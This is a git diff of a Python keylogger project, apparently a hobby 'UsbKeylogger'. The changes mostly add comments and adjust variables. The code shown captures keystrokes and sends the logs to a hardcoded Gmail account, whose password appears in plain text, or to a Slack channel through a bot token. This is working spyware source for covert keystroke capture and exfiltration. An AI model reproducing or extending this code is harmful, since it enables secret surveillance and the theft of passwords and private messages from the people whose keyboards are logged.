@@ -7,21 +7,20 @@ from datetime import datetime # Imported to retrieve the current date times at c
 from email import message # Imported to format emails for sending keylohs
 
 from asyncio.windows_events import NULL
-from email import message
-from slack_sdk import WebClient
+from slack_sdk import WebClient # Permits the use of Slack
 from dotenv import load_dotenv
 import os
 
-load_dotenv()
+load_dotenv() # Loads environment to use variable in .env
 SLACK_BOT_TOKEN = os.environ['SLACK_BOT_TOKEN']
-bot = WebClient(SLACK_BOT_TOKEN)
+slackBot = WebClient(SLACK_BOT_TOKEN)
 
 # Email Variables for report type of emails
 EMAIL = "ph4ntom77projects@gmail.com" # Email that reports are sent to
 EMAIL_PW = "keylogger!!" # Password for Email
 
-#Time Interval Variable
-LOG_INTERVAL = 20 # Every 300 Seconds (5 minutes) a report is sent
+# Time Interval Variable
+LOG_INTERVAL = 60 # Every 300 Seconds (5 minutes) a report is sent
 
 class UsbKeylogger:
     def __init__(self, reportInterval, reportType):
@@ -53,8 +52,8 @@ class UsbKeylogger:
         email.quit() # Terminates the email server
 
     def reportSlack(self, postHeader):
-            slackPost = postHeader + "\n" + self.keylog
-            bot.chat_postMessage(channel = "C036JLKMVR6", text = slackPost)
+            slackPost = postHeader + "\n" + self.keylog # Creates a string variable with the log time interval as the first line and the contents as the body of the post
+            slackBot.chat_postMessage(channel = "C036JLKMVR6", text = slackPost) # The slack posts the string variable in the specified channel
 
     #def reportText(self):
     #def reportDiscord(self):
@@ -82,10 +81,10 @@ class UsbKeylogger:
             if self.reportType == "File":
                 self.reportFile() # Calls the reportFile function to create a file for keylog recording
             elif self.reportType == "Email":
-                self.reportEmail(EMAIL, EMAIL_PW, self.keylog, self.fileIndentifier) # Calls the reportEmail funciton to sends an email of keylog recording
+                self.reportEmail(EMAIL, EMAIL_PW, self.keylog, self.fileIndentifier) # Calls the reportEmail function to sends an email of keylog recording
             elif self.reportType == "Slack":
-                self.reportSlack(self.fileIndentifier)
-                
+                self.reportSlack(self.fileIndentifier) # Calls the reportSlack function to send keylogs as a slack message in a "keylogger" channel
+
             self.startTimeVal = datetime.now() # Retrieves the start datetime for utilization in file identifying
         
         self.keylog = "" # Resets the value of self.keylog to contain nothing
@@ -95,7 +94,7 @@ class UsbKeylogger:
 
     def start(self):
         self.startTimeVal = datetime.now() # Gets current date time
-        keyboard.on_release(callback = self.callbackKeyboard) # Initializes the keylogger on
+        keyboard.on_release(callback = self.callbackKeyboard) # Initializes the keylogger on rlease of a key
         self.reportKeyLog() # Calls the function that records the keylogs within the time interval
         keyboard.wait() 
 
